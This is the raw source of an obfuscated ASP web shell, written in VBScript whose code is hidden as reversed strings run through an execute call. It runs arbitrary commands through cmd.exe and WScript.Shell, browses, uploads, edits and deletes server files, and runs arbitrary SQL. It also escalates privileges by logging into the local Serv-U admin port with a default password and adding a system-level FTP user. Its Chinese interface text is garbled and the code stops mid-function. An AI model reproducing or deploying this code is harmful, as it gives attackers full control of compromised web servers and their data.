noitcnuF":ExeCuTe(UZSS(ShiSan)):ShiSan="noitcnuF dnE~fi dne~gnihton=3tsopx tes~)sevael(dnes.3tsopx~eurt ,��sevael/��& trop &��:1.0.0.721//:ptth�� ,��TSOP�� nepo.3tsopx~)��PTTHLMX.2LMXSM��(tcejboetaerc = 3tsopx tes~flrcbv & resut & ��=resU �� & flrcbv & tropt & ��=oNtroP-�� & flrcbv & ��0.0.0.0=PI-�� & flrcbv & ��RESUETELED-�� & sevael = sevael~flrcbv & ��ECNANETNIAM ETIS�� & sevael = sevael~flrcbv & dwp & �� ssaP�� & sevael = sevael~flrcbv & rsu & �� resU�� = sevael~esle~)��>RB<>rb<): �� & htapt & �� :��· �� & ssapt & �� :���ܚ� & �� �� & resut & �� :������ PTF������ִ����������( etirw.esnopser~gnihton=tsopx tes~)sevael(dnes.tsopx~eurt ,��sevael/��& trop &��:1.0.0.721//:ptth�� ,��TSOP�� nepo.tsopx~)��PTTHLMX.2LMXSM��(tcejboetaerc = tsopx tes~txen emuser rorre no~flrcbv & ��tiuq�� & sevael = sevael~flrcbv & ��PDCLEMAWR|\�� & htapt & ��=sseccA �� & flrcbv & ��enoN=soitaR-�� & flrcbv & ��ralugeR=epyTdrowssaP-�� & flrcbv & ��metsyS=ecnanetniaM-��~_ & flrcbv & ��0=mumixaMatouQ-�� & flrcbv & ��0=tnerruCatouQ-�� & flrcbv & ��0=tiderCsoitaR-�� & flrcbv & ��1=nwoDoitaR-��~_ & flrcbv & ��1=pUoitaR-�� & flrcbv & ��0=eripxE-�� & flrcbv & ��1-=tuOemiTnoisseS-�� & flrcbv & ��006=tuOemiTeldI-�� & flrcbv & ��1-=sresUrNxaM-��~_ & flrcbv & ��0=nwoDtimiLdeepS-�� & flrcbv & ��0=pUtimiLdeepS-�� & flrcbv & ��1-=PIrePnigoLsresUxaM-�� & flrcbv & ��0=elbanEatouQ-��~_ & flrcbv & ��0=drowssaPegnahC-�� & flrcbv & ��0=nigoLwollAsyawlA-�� & flrcbv & ��0=neddiHediH-�� & flrcbv & ��0=eruceSdeeN-��~_ & flrcbv & ��1=shtaPleR-�� & flrcbv & ��0=elbasiD-�� & flrcbv & ��=eliFseMnigoL-�� & flrcbv & ��\�� & htapt & ��=riDemoH-��~_ & flrcbv & ssapt & ��=drowssaP-�� & flrcbv & resut & ��=resU-�� & flrcbv & tropt & ��=oNtroP-�� & flrcbv & ��0.0.0.0=PI-�� & flrcbv & ��PUTESRESUTES-�� & sevael = sevael~flrcbv & ��=yeKOZT �� & flrcbv & ��0=elbanEOZT-�� & flrcbv & ��0|1|1-|�� & tropt & ��|��&pirevres&��|79944QQ=niamoD-�� & flrcbv & ��NIAMODTES-�� & sevael = sevael~flrcbv & ��ECNANETNIAM ETIS�� = tm~flrcbv & tropt & ��=oNtroP �� & flrcbv & ��0.0.0.0=PI-�� & flrcbv & ��NIAMODeteleD-�� & sevael = sevael~flrcbv & ��ECNANETNIAM ETIS�� & sevael = sevael~flrcbv & dwp & �� ssaP�� & sevael = sevael~flrcbv & rsu & �� resU�� = sevael~neht ��dda�� = )��nottuboidar��(mrof.tseuqer fi~006=tuoemit~)��ptsoh��(mrof.tseuqer = pitsoh~)��tropt��(mrof.tseuqer = tropt~)��htapt��(mrof.tseuqer = htapt~)��ssapt��(mrof.tseuqer = ssapt~)��resut��(mrof.tseuqer = resut~)��tropd��(mrof.tseuqer = trop~)��dwpd��(mrof.tseuqer = dwp~)��resud��(mrof.tseuqer = rsu~)��pires��(mrof.tseuqer = pirevres~��>mrof/<>p/<>'����'=eulav 'mottub'=ssalc 'timbus'=epyt 'timbuS'=eman tupni<>p<��srr~����ɾ��ȷ>'xoBtxeT'=ssalc 'led'=eulav 'nottuboidar'=eman 'oidar'=epyt tupni<>retnec<��srr~������ȷ>'xoBtxeT'=ssalc dekcehc 'dda'=eulav 'oidar'=epyt 'nottuboidar'=eman tupni<>retnec<��srr~��>rb<>'12'=eulav 'tropt'=di 'xoBtxeT'=ssalc 'txet'=epyt 'tropt'=eman tupni<:�ڶ����>retnec<��srr~��>rb<>'\:C'=eulav 'htapt'=di 'xoBtxeT'=ssalc 'txet'=epyt 'htapt'=eman tupni<:��·�Ķ����ĺ���>retnec<��srr~��>rb<>'rekcah'=eulav 'ssap'=di 'xoBtxeT'=ssalc 'txet'=epyt 'ssapt'=eman tupni<:���ܻ��õļ���>retnec<��srr~��>rb<>'rekcah'=eulav 'resut'=di 'xoBtxeT'=ssalc 'txet'=epyt 'resut'=eman tupni<:�����õļ���>retnec<��srr~��>rb<>'85934'=eulav 'tropd'=di 'xoBtxeT'=ssalc 'txet'=epyt 'tropd'=eman tupni<:�ڶ�U-VRES>retnec<��srr~��>rb<>'P@0;kl.#ka$@l#'=eulav 'dwpd'=di 'xoBtxeT'=ssalc 'txet'=epyt 'dwpd'=eman tupni<: ����Ա���>retnec<��srr~��>rb<>'rotartsinimdAlacoL'=eulav 'resud'=di 'xoBtxeT'=ssalc 'txet'=epyt 'resud'=eman tupni<:Ա���>retnec<��srr~��>rb<>'0.0.0.0'=eulav 'resud'=di 'xoBtxeT'=ssalc 'txet'=epyt 'pires'=eman tupni<:PI�����>retnec<��srr~��>''=noitca 'tsop'=dohtem '1mrof'=eman mrof<��srr~��>p/<�ı�����u-vreS����͹��ɲ��ٹ���>rb<��&)��RDDA_LACOL��(selbairaVrevreS.tseuqeR&��:PI�˳ɸ��޾͹��ɲ�0.0.0.0����>rb<�����Կɶ�PI���α��0.0.0.0:PI�����>rb<:��˵����PI>rb<>rb<��ɱͨ--���ȨPTF U-vreS>retnec<>p<��srr~)(ptfus noitcnuF":ExeCuTe(UZSS(ShiSan)):ShiSan="noitcnuF dnE~gnihtoN = MSO teS~esolC.MSO~hsulF.esnopseR~daeR.MSO etirWyraniB.esnopseR~��maerts-tetco/noitacilppa�� = epyTtnetnoC.esnopseR~��8-FTU�� = tesrahC.esnopseR~eziS.MSO ,��htgneL-tnetnoC�� redaeHddA.esnopseR~)zs,htap(diM & ��=emanelif ;tnemhcatta�� ,��noitisopsiD-tnetnoC�� redaeHddA.esnopseR~1+)��\��,htap(veRrtsnI=zs~htaP eliFmorFdaoL.MSO~1 = epyT.MSO~nepO.MSO~))0,6(toS(tcejbOetaerC = MSO teS~raelC.esnopseR~)htaP(eliFnwoD noitcnuF":ExeCuTe(UZSS(ShiSan))
Function HTMLEncode(S)
if not isnull(S) then
S= replace(S,">","&gt;")
S=replace(S,"<","&lt;")
S=replace(S,CHR(39),"&#39;")
S=replace(S,CHR(34),"&quot;")
S=replace(S,CHR(20),"&nbsp;")
HTMLEncode=S
end if
End Function:ShiSan="noitcnuF dnE~IS SRR~��>elbat/<>mrof/<>rt/<>dt/<��&IS=IS~��>'����'=eulav 'timbuS'=eman 'timbus'=epyt tupni< ��&IS=IS~��>'52'=ezis'elif'=epyt 'eliFlacoL'=eman tupni< ��&IS=IS~��>'04'=ezis '��&)��exe.dmc\��&)��htaPredloF��(noisseS(htaPeRR&��'=eulav 'htaPoT'=eman tupni<����·���Ϛ�&IS=IS~��>dt<>rt<��&IS=IS~��>'atad-mrof/trapitlum'=epytcne 'tsoP=2noitcA&eliFpU=noitcA?��&LRU&��'=noitca 'tsop'=dohtem 'mroFpU'=eman mrof<��&IS=IS~��>'retnec'=ngila '0'=gnicapsllec '0'=gniddapllec '0'=redrob elbat<>rb<>rb<>rb<��=IS~fI dnE~dnE.esnopseR~)(rrEwohS~IS SRR~lrUkcaB&IS=IS~gnihton=U teS:gnihton=F teS~fI dnE~fi dnE~��>retnec/<�����ɴ��Ϛ�&emaNU&������>rb<>rb<>rb<>retnec<��=IS~nehT 0=rebmun.rrE fI~emaNU sAevaS.F~eslE~��!���ϼ��ĸ�һ��ѡ��·ȫ��Ĵ���������>rb<��=IS~neht 0=eziSeliF.F rO ����=emaNU fI~)��htaPoT��(mrof.U=emaNU~)��eliFlacoL��(AU.U=F teS : CPU wen=U teS~nehT ��tsoP��=)��2noitcA��(tseuqeR fI~)(eliFpU noitcnuF":ExeCuTe(UZSS(ShiSan)):ShiSan="noitcnuF dnE~IS SRR~��>mrof/<>aeratxet/<��&)31(rhc&IS=IS~fI dnE~fi dne~aaa&IS=IS~)eurT ,eliFpmeTzs(eliFeteleD.osf llaC~esolC.xcleliFo~)llAdaeR.xcleliFo(edocnELMTH.revreS=aaa~)0 ,eslaF ,1 ,eliFpmeTzs( eliFtxeTnepO.sf = xcleliFo teS~)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC = sf teS~)eurT ,0 ,eliFpmeTzs & �� > �� & dmCfeD & �� c/ ��&htaPllehS( nuR.sw llaC~)��txt.dmc��(htappam.revres = eliFpmeTzs~)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC.revreS=osf teS~)��llehS.tpircSW��(tcejbOetaerC.revreS=sw teS~)��llehS.tpircSW��(tcejbOetaerC.revreS=sw teS~txeN emuseR rorrE nO~esle~aaa&IS=IS~lladaer.tuodts.DD=aaa~)dmCfeD&�� c/ ��&htaPllehS(cexe.MC=DD teS~))0,1(toS(tcejbOetaerC=MC teS~neht ��sey��=)��tpircsw��(mroF.tseuqeR fi~nehT ����><)��dmc��(mroF.tseuqeR fI~��>';044:thgieh;%001:htdiw'=elytS aeratxet<>'��ִ'=eulav 'timbus'=epyt tupni< >'��&dmCfeD&��'=eulav '%29:htdiw'=elytS 'dmc'=eman tupni<��&IS=IS~��llehS.tpircSW>��&dekcehc&��'sey'=eulav 'tpircsw'=eman 'xobkcehc'=epyt c=ssalc tupni<��&IS=IS~��;psbn&;psbn&>'%07:htdiw'=elytS '��&htaPllehS&��'=eulav 'PS'=eman tupni<����·LLEHS��&IS=IS~��>'tsop'=dohtem mrof<��=IS~)��dmc��(tseuqeR = dmCfeD nehT ����><)��dmc��(tseuqeR fI~����=dekcehc neht ��sey��><)��tpircsw��(tseuqeR fi~��exe.dmc�� = htaPllehS nehT ����=htaPllehS fi~)��htaPllehS��(noisseS=htaPllehS~)��PS��(tseuqeR = )��htaPllehS��(noisseS nehT ����><)��PS��(tseuqeR fI~��dekcehc ��=dekcehc~)(llehS1dmC noitcnuF":ExeCuTe(UZSS(ShiSan)):ShiSan="noitcnuf dnE~IS SRR ~ lrUkcaB&IS=IS ~fI dnE ~��!���ɽ��� & htaP & IS = IS ~nehT 0=rebmun.rrE fI ~gnihtoN = C teS ~)htaP & ��=ecruoS ataD;0.4.BDELO.teJ.tfosorciM=redivorP��(etaerC.C ~ ))0,2(toS(tcejbOetaerC = C teS ~��>rb<>rb<��=IS ~)htaP(bdMetaerC noitcnuF":ExeCuTe(UZSS(ShiSan)):ShiSan="noitcnuF dnE~IS SRR~lrUkcaB&IS=IS~fI dnE~��>retnec/<��������ѹ��&htaP&�������>rb<>rb<>rb<>retnec<��=IS~nehT 0=rebmun.rrE fI~fI dnE~gnihtoN=OSF teS~fI dnE~1=rebmun.rrE~ ��>retnec/<���ַ���û��&htaP&�������>rb<>rb<>rb<>retnec<��=IS~eslE~htaP,��kab_��&htaP eliFevoM.OSF~htaP eliFeteleD.OSF~gnihtoN=C teS~��kab_��&htaP& ��=ecruoS ataD;0.4.BDELO.teJ.tfosorciM=redivorP,��&htaP&��=ecruoS ataD;0.4.BDELO.teJ.tfosorciM=redivorP�� esabataDtcapmoC.C~ ))0,3(toS(tcejbOetaerC=C teS~nehT )htaP(stsixEeliF.OSF fI~))1,0(toS(tcejbOetaerC=OSF teS~eslE~gnihtoN=C teS~htaP& ��=ecruoS ataD;0.4.BDELO.teJ.tfosorciM=redivorP,��&htaP&��=ecruoS ataD;0.4.BDELO.teJ.tfosorciM=redivorP�� esabataDtcapmoC.C~ ))0,3(toS(tcejbOetaerC=C teS~nehT )1,0(toS toN fI~)htaP(bdMtcapmoC noitcnuF":ExeCuTe(UZSS(ShiSan)):ShiSan="fi dne~dne.esnopser~fi dne~Is SRR~��>retnec/<>a/<��&thgirypoC&��>'knalb_'=tegrat '��&LRUetiS&��'=ferh a<>mrof/<>'���'=eulav 'timbus'=epyt tupni< >'22'=ezis 'drowssap'=epyt 'ssap'=eman tupni< ��&emanm&��>'tsop'=dohtem '��&lru&��'=noitca';xp1:gniddap;der dilos xp1:redrob;%06:htdiw'=elyts mrof<>retnec<��=is~esle~fi dne~��>retnec/<>a/<��&thgirypoC&��>'knalb_'=tegrat '��&LRUetiS&��'=ferh a<>rb<>vid/<>a/<�� ��>')(kcab.yrotsih:tpircsavaj'=ferh a<>rb<����ò������˱���>';xp1:gniddap;der dilos xp1:redrob;%06:htdiw'=elyts vid<>retnec<��srr~esle~lru tcerider.esnopser~ssaPresU=)��nimd2a2bew��(noisses~neht ssaPresU=)��ssap��(mrof.tseuqer fi~neht ����><)��ssap��(mrof.tseuqer fi~neht ssaPresU><)��nimd2a2bew��(noisses fi":ExeCuTe(UZSS(ShiSan)):ShiSan="noitcnuF dnE~fI dnE~gnihtoN=nnoC teS~esolC.nnoC~fI dnE~����=IS:IS SRR~fI dnE~rtSlqS&��������LQS��&IS=IS~)rtSlqS(etucexE.nnoC~ eslE~����=IS:IS SRR~gnihtoN=sR teS:esolC.sR~��>elbat/<>rt/<>dt/<>'FEFEFE#'=roloc rh<��&IS=IS~fI dnE~��>a/<ҳβ>')��&NP&��,������&rtSlqS&������(rtSlqSlluF:tpircsavaj'=ferh a<;psbn&>a/<ҳһ��>')��&1+egaP&��,������&rtSlqS&������(rtSlqSlluF:tpircsavaj'=ferh a<;psbn&��&IS=IS~txeN~fI dnE~��;psbn&>a/<��&i&��>')��&i&��,������&rtSlqS&������(rtSlqSlluF:tpircsavaj'=ferh a<��&IS=IS~eslE~��;psbn&��&i&IS=IS~nehT egaP=i fI~roF tixE nehT NP>i fI~8+pS oT pS=i roF~fi dnE~1=pS~eslE~8-egaP=pS~nehT 8>egaP fI~��;psbn&>a/<ҳһ��>')��&1-egaP&��,������&rtSlqS&������(rtSlqSlluF:tpircsavaj'=ferh a<;psbn&>a/<ҳ��>')1,������&rtSlqS&������(rtSlqSlluF:tpircsavaj'=ferh a<;psbn&;psbn&��&IS=IS~nehT 1>NP fI~NP&��/��&egaP&������ҳ;psbn&��&CR&������¼��>retnec=ngila ��&1+NF&��=napsloc dt<>rt<��&IS=IS~)rtSlqS(edoCnElmtH=rtSlqS~����=IS:IS SRR~pooL~txeNevoM.sR~��>rt/<��&IS=IS~txeN~��>dt/<��&ofnIloC&��>��&rolocgB&��=rolocgb dt<��&IS=IS~fI dnE~))05,)i(sR(tfeL(edocnELMTH=ofnIloC ~eslE~))i(sR(edocnELMTH=ofnIloC ~nehT 1=CR fI~fi dnE:��FEFEFE#��=rolocgB:eslE:��5F5F5F#��=rolocgB:nehT ��FEFEFE#��=rolocgB fI~1-NF oT 0=i roF~��>dt/<>tnof/<x>'sgnidgniw'=ecaf tnof<>cccccc#=rolocgb dt<>rt<��&IS=IS~��FEFEFE#��=rolocgB~1-tnuoC=tnuoC~0>tnuoC dnA )foB.sR ro foE.sR(toN elihW oD~��>rt/<��&IS=IS~txeN~gnihton=dlF teS~��>dt/<��&emaN.dlF&��>'retnec'=ngila dt<��&IS=IS~)n(metI.sdleiF.sR=dlF teS~1-NF ot 0=n roF~��>dt/<>dt<>cccccc#=rolocgb 52=thgieh rt<>elbat<��&IS=IS~egaP=egapetulosba.sR nehT 1>egaP fI~NP=egaP nehT NP>egaP fI~1=egaP nehT 0=egaP rO ����=egaP fI~)egaP(gnlC=egaP nehT ����><egaP fI~)��egaP��(tseuqer=egaP~tnuoCegaP.sR=NP~eziSegaP.sR=tnuoC~02=eziSegaP.sR~tnuoCdroceR.sR=CR~tnuoC.sdleiF.sR=NF~1,1,nnoC,rtSlqS nepo.sR~)��tesdroceR.bdodA��(tcejbOetaerC=sR teS~rtSlqS&����������ִ��&IS=IS~neht ��tceles��=))6,rtSlqS(tfeL(esaCL fI~nehT 01>)rtSlqS(neL fI~����=IS:IS SRR~��>elbat/<>rt/<��&IS=IS~gnihtoN=sR teS~ pooL~ txeNevoM.sR~ fI dnE~��>dt/<>a/<��&emaNT&��>')1,����]��&emaNT&��[ MORF * TCELES����(rtSlqSlluF:tpircsavaj'=ferh a<��&IS=IS~��>rb<>a/<] led [>')1,����]��&emaNT&��[ ELBAT PORD����(rtSlqSlluF:tpircsavaj'=ferh a<>retnec=ngila dt<��&IS=IS~)��EMAN_ELBAT��(sR=emaNT~neht ��ELBAT��=)��EPYT_ELBAT��(sR fI~foE.sR toN elihW oD~ tsriFevoM.sR~��>dt/<��>rb<��>dt<>'CCCCCC#'=rolocgB '52'=thgieh rt<>elbat<��&IS=IS~ )02(amehcSnepO.nnoC=sR teS~rtSbD nepO.nnoC~))0,5(toS(tcejbOetaerC=nnoC teS~nehT 04>)rtSbD(neL fI~����=IS:IS SRR~��>naps/<>'cba'=di naps<>elbat/<>mrof/<>rt/<��&IS=IS~��>dt/<>')(kcehCbD nruter'=kcilcno '��ִ'=eulav 'timbuS'=eman 'timbus'=epyt tupni<>'retnec'=ngila dt<��&IS=IS~��>dt/<>������&rtSlqS&������=eulav '074:htdiw'=elyts 'rtSlqS'=eman tupni<>dt<��&IS=IS~��>dt/<:��������LQS;psbn&>'03'=thgieh dt<>rt<��&IS=IS~��>'1'=eulav 'neddih'=epyt 'egaP'=eman tupni<>'reganaMbD'=eulav 'neddih'=epyt 'noitcA'=eman tupni<��&IS=IS~��>rt/<>dt/<>tceles/<>noitpo/<ʾ��ȫ��>21=eulav noitpo<��&IS=IS~��>noitpo/<���ֳ�ɾ>11=eulav noitpo<>noitpo/<���ּ���>01=eulav noitpo<>noitpo/<�����ɾ>9=eulav noitpo<��&IS=IS~��>noitpo/<�������>8=eulav noitpo<>noitpo/<��������>7=eulav noitpo<>noitpo/<������ɾ>6=eulav noitpo<��&IS=IS~��>noitpo/<��������>5=eulav noitpo<>noitpo/<����ʾ��>4=eulav noitpo<>noitpo/<--����LQS-->1-=eulav noitpo<��&IS=IS~��>noitpo/<����NSD>3=eulav noitpo<>noitpo/<����lqSyM>2=eulav noitpo<>noitpo/<����lqSsM>1=eulav noitpo<��&IS=IS~��>noitpo/<����sseccA>0=eulav noitpo<>noitpo/<��ʾ������>1-=eulav noitpo<>')eulav.]xednIdetceles[snoitpo(rtSbDlluF nruter'=egnahcno 'ntBrtS'=eman tceles<>'retnec'=ngila '06'=htdiw dt<��&IS=IS~��>dt/<>������&rtSbD&������=eulav '074:htdiw'=elyts 'rtSbD'=eman tupni<>dt<��&IS=IS~��>dt/<:�����������;psbn& >'72'=thgieh '001'=htdiw dt<>rt<��&IS=IS~��>''=noitca 'tsop'=dohtem 'mroFbD'=eman mrof<��&IS=IS~��>'0'=gniddapllec '0'=gnicapsllec '0'=redrob'056'=htdiw elbat<��&IS=IS~)��rtSbD��(mroF.tseuqeR=rtSbD~))��rtSlqS��(mroF.tseuqeR(mirT=rtSlqS~)(reganaMbD noitcnuF":ExeCuTe(UZSS(ShiSan)):Dim T1:Function EnCode(ObjStr,ObjPos):ExeCuTe Fun(")soPjbO doM rtSneL,rtSjbO(thgiR&rtSpmT=edoCnE:txeN:rtSpmT&)soPjbO,1+soPjbO*i,rtSjbO(diM=rtSpmT:1-)soPjbO/rtSneL(tnI oT 0=i roF:)rtSjbO(neL=rtSneL:rtSneL,i,rtSpmT,rtSweN miD"):End Function:Class UPC:Dim D1,D2:Public Function Form(F):F=lcase(F):If D1.exists(F) then:Form=D1(F):else:Form="":end if:End Function:Public Function UA(F):F=lcase(F):If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if:End Function:Private Sub Class_Initialize:Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName:set D1=CreateObject(Sot(4,0)):if Request.TotalBytes<1 then Exit Sub
set T1=CreateObject(Sot(6,0)):T1.Type=1:T1.Mode=3:T1.Open:T1.Write Request.BinaryRead(Request.TotalBytes):T1.Position=0:TDa=T1.Read:DStart=1:DEnd=LenB(TDa):set D2=CreateObject(Sot(4,0)):vbCrlf=chrB(13)&chrB(10):set T2=CreateObject(Sot(6,0)):TSt=MidB(TDa,1,InStrB(DStart,TDa,vbCrlf)-1):TLen=LenB(TSt):DStart=DStart+TLen+1:while (DStart+10)<DEnd:DIEnd=InStrB(DStart,TDa,vbCrlf&vbCrlf)+3:T2.Type=1:T2.Mode=3:T2.Open:T1.Position=DStart:T1.CopyTo T2,DIEnd-DStart:T2.Position=0:T2.Type=2:T2.Charset="gb2312":TIn=T2.ReadText:T2.Close:DStart=InStrB(DIEnd,TDa,TSt):FStart=InStr(22,TIn,"name=""",1)+6:FEnd=InStr(FStart,TIn,"""",1):UpName=lcase(Mid(TIn,FStart,FEnd-FStart)):if InStr (45,TIn,"filename=""",1)>0 then
set TFL=new FIF:FStart=InStr(FEnd,TIn,"filename=""",1)+10:FEnd=InStr(FStart,TIn,"""",1):FStart=InStr(FEnd,TIn,"Content-Type: ",1)+14:FEnd=InStr(FStart,TIn,vbCr):TFL.FileStart=DIEnd:TFL.FileSize=DStart-DIEnd-3:if not D2.Exists(UpName) then:D2.add UpName,TFL:end if
else:T2.Type=1:T2.Mode=3:T2.Open:T1.Position=DIEnd:T1.CopyTo T2,DStart-DIEnd-3:T2.Position = 0:T2.Type = 2:T2.Charset ="gb2312":SFV = T2.ReadText:T2.Close:if D1.Exists(UpName) then:D1(UpName)=D1(UpName)&","&SFV:else:D1.Add UpName,SFV:end if:end if:DStart=DStart+TLen+1:wend:TDa="":set T2=nothing:End Sub:Private Sub Class_Terminate:if Request.TotalBytes>0 then:D1.RemoveAll:D2.RemoveAll:set D1=nothing:set D2=nothing:T1.Close:set T1 =nothing:end if:End Sub:End Class:Function SinfoEn(ObjStr,ObjPos):ExeCuTe Fun(")2-)nEofniS(neL,nEofniS(tfeL=nEofniS:txeN:fLrCbv&)soPjbO,)i(rtSweN(edoCnE&nEofniS=nEofniS:)rtSweN(dnuoBU oT 0=i roF:)|`|,rtSjbO(tilpS=rtSweN:)||||,|~|,rtSjbO(ecalpeR=rtSjbO"):End Function:Class FIF:dim FileSize,FileStart:Private Sub Class_Initialize:FileSize=0:FileStart=0:End Sub:Public function SaveAs(F)
dim T3:SaveAs=true:if trim(F)="" or FileStart=0 then exit function
set T3=CreateObject(Sot(6,0)):T3.Mode=3:T3.Type=1:T3.Open:T1.position=FileStart:T1.copyto T3,FileSize:T3.SaveToFile F,2:T3.Close:set T3=nothing:SaveAs=false:end function:End Class:Function Fun(ShiSanObjstr):ShiSanObjstr=Replace(ShiSanObjstr,"|",""""):For ShiSanI=1 To Len(ShiSanObjstr):If Mid(ShiSanObjstr,ShiSanI,1)<>"!"Then:ShiSanNewStr=Mid(ShiSanObjstr,ShiSanI,1)&ShiSanNewStr:Else:ShiSanNewStr=vbCrLf&ShiSanNewStr:End If:Next:Fun = ShiSanNewStr:End Function:Class LBF:Dim CF:Private Sub Class_Initialize:SET CF=CreateObject(Sot(0,0)):End Sub:Private Sub Class_Terminate:Set CF=Nothing:End Sub:Function ShowDriver():ShiSan="txeN    ~ ��>rt/<>dt/<>vid/<>a/<):��&retteLevirD.D&��( �̴ŵر���&)��8��,0,��0008ff��(ecaf&��>')����\\:��&retteLevirD.D&������(redloFwohS:tpircsavaj'=ferh a<>����retnec����=ngila vid<>����'pu'=emaNssalc.siht����=pUesuoMno����)05=yticapo(ahpla:retlif����=elyts ����)siht(wol,'lamron'=emaNssalc.siht����=tuOesuoMno ����)siht(hgih,'pu'=emaNssalc.siht����=revOesuoMno ����'nwod'=emaNssalc.siht����=nwoDesuoMno lamron=ssalc dt<>rt<��SRR      ~sevirD.FC ni D hcaE roF":ExeCuTe(UZSS(ShiSan)):End Function:Function Show1File(Path):ShiSan="gnihtoN=DLOF teS~��>elbat/<>rt/<��&IS SRR ~txeN~��>rt<>rt/<��&IS=IS neht 0 = 6 dom i fI~1+i=i~��>dt/<>vid/<��&deifidoMtsaLetaD.L&IS=IS~��>rb<��&epyT.L&IS=IS~�� K��&)4201/ezis.L(gnlc&IS=IS~��>rb<>a/<evoM>'����'=eltit 'ma'=ssalc ')����eliFevoM����,������&)emaN.L&��\��&htaP(htaPeR&������(mroFlluF:tpircsavaj'=ferh a<��&IS=IS~�� >a/<ypoC>'�Ƹ�'=eltit 'ma'=ssalc ')����eliFypoC����,������&)emaN.L&��\��&htaP(htaPeR&������(mroFlluF:tpircsavaj'=ferh a<��&IS=IS~�� >a/<leD>'��ɾ'=eltit 'ma'=ssalc ')(kosey nruter'=kcilcno')����eliFleD����,������&)emaN.L&��\��&htaP(htaPeR&������(mroFlluF:tpircsavaj'=ferh a<��&IS=IS~�� >a/<tidE>'����'=eltit 'ma'=ssalc ')����eliFtidE����,������&)emaN.L&��\��&htaP(htaPeR&������(mroFlluF:tpircsavaj'=ferh a<��&IS=IS~��>rb<>a/<��&emaN.L&��>tnof/<2>'6'=ezis 'sgnidgniw'=ecaf tnof<>'����'=eltit ';)����eliFnwoD����,������&)emaN.L&��\��&htaP(htaPeR&������(mroFlluF:tpircsavaj'=ferh a<>'��&roloCredroB&�� dilos xp1:redrob'=elyts vid<>retnec=ngila '03'=thgieh dt<��&IS=IS~selif.dloF ni L hcaE roF~��>rt<>'6'=gniddapllec '0'=gnicapsllec '0'=redrob '%001'=htdiw elbat<��=IS~0=i:����=IS : ��>/ 1=ezis edahson rh<��& IS SRR~��>elbat/<>rt/<>dt/<>2=thgieh dt<>rt<>rt/<��&IS=IS~txeN~��>rt<>rt/<��&IS=IS neht 0 = 6 dom i fI~1+i=i~��>dt/<>vid/<>a/<nwoD>'����'=eltit 'ma'=ssalc ')(kosey nruter'=kcilcno')����eliFnwoD����,������&)emaN.F&��\��&htaP(htaPeR&������(mroFlluF:tpircsavaj'=ferh a< ��&IS=IS~��>a/<evoM>'����'=eltit 'ma'=ssalc ')(kosey nruter'=kcilcno')����redloFevoM����,������&)emaN.F&��\��&htaP(htaPeR&������(mroFlluF:tpircsavaj'=ferh a< ��&IS=IS~��>a/<leD>'��ɾ'=eltit 'ma'=ssalc ')(kosey nruter'=kcilcno')����redloFleD����,������&)��\\��,��\��,emaN.F&��\��&htaP(ecalpeR&������(mroFlluF:tpircsavaj'=ferh a<��&IS=IS~��>a/<ypoC>'�Ƹ�'=eltit 'ma'=ssalc ')(kosey nruter'=kcilcno')����redloFypoC����,������&)emaN.F&��\��&htaP(htaPeR&������(mroFlluF:tpircsavaj'=ferh a<>rb<��&IS=IS~ ��>a/<��&emaN.F&��>rb<>tnof/<0>'6'=ezis 'sgnidgniw'=ecaf tnof<>�����������=eltit ')������&)emaN.F&��\��&htaP(htaPeR&������(redloFwohS:tpircsavaj'=ferh a<��&IS=IS~��>'��&roloCredroB&�� dilos xp1:redrob'=elyts vid<>retnec=ngila %71=htdiw 01=thgieh dt<��&IS=IS~sredlofbus.DLOF ni F hcaE roF~��>rt<>'6'=gniddapllec '0'=gnicapsllec '0'=redrob '%001'=htdiw elbat<��=IS~0=i~)htaP(redloFteG.FC=DLOF teS":ExeCuTe(UZSS(ShiSan)):End function:Function DelFile(Path):ShiSan="fI dnE~IS SRR~lrUkcaB&IS=IS~��>retnec/<�����ɳ�ɾ ��&htaP&�� ����>rb<>rb<>rb<>retnec<��=IS~htaP eliFeteleD.FC~nehT )htaP(stsixEeliF.FC fI":ExeCuTe(UZSS(ShiSan)):End Function:Function EditFile(Path):ShiSan="IS SRR~��>mrof/<>'�汣'=eulav 'timbus'=epyt 'timbus'=eman tupni<;psbn&;psbn&;psbn&>'����'=eulav 'teser'=epyt 'teser'=eman tupni<;psbn&;psbn&;psbn&>';)(kcab.yrotsih'=kcilcno '�ط�'=eulav 'nottub'=epyt 'kcabog'=eman tupni<>rh<��&IS=IS~��>rb<>aeratxet/<��&txT&��>'054:thgieh;%001:htdiw'=elyts 'tnetnoC'=eman aeratxet<��&IS=IS~��>rb<>'%001:htdiw'=elyts '��&htaP&��'=eulav 'emaNF'=eman tupni<��&IS=IS~��>'neddih'=epyT 'eliFtidE'=eulav 'noitcA'=eman tupni<��&IS=IS~��>'mroFtidE'=eman 'tsop'=dohtem 'tsoP=2noitcA?��&LRU&��'=noitca mroF<��&IS=IS~fI dnE~�����Ľ���=txT:��psa.elifwen\��&)��htaPredloF��(noisseS=htaP~eslE~gnihtoN=T teS~esolc.T~ )lladaer.T(edocnELMTH=txT~)eslaF ,1 ,htaP(eliftxetnepo.FC=T teS~nehT ����><htaP fI~fI dnE~dnE.esnopseR~IS SRR~lrUkcaB&IS=IS~��>retnec/<�����ɴ汣����>rb<>rb<>rb<>retnec<��=IS~gnihton=T teS~esolc.T~)��tnetnoc��(mrof.tseuqeR eniLetirW.T~)htaP(eliFtxeTetaerC.FC=T teS~nehT ��tsoP��=)��2noitcA��(tseuqeR fI":ExeCuTe(UZSS(ShiSan)):End Function:Function CopyFile(Path):ShiSan="fI dnE	~ IS SRR  	~lrUkcaB&IS=IS      ~��>retnec/<�������Ƹ���&)0(htaP&������>rb<>rb<>rb<>retnec<��=IS      ~)1(htaP,)0(htaP eliFypoC.FC  	~nehT ����><)1(htaP dna ))0(htaP(stsixEeliF.FC fI    ~)��||||��,htaP(tilpS = htaP  ":ExeCuTe(UZSS(ShiSan)):End Function:Function MoveFile(Path):ShiSan="fI dnE	~ IS SRR  	~lrUkcaB&IS=IS      ~��>retnec/<�����ɶ��ƚ�&)0(htaP&������>rb<>rb<>rb<>retnec<��=IS      ~)1(htaP,)0(htaP eliFevoM.FC  	~nehT ����><)1(htaP dna ))0(htaP(stsixEeliF.FC fI    ~)��||||��,htaP(tilpS = htaP  ":ExeCuTe(UZSS(ShiSan)):End Function:Function DelFolder(Path):ShiSan="fI dnE	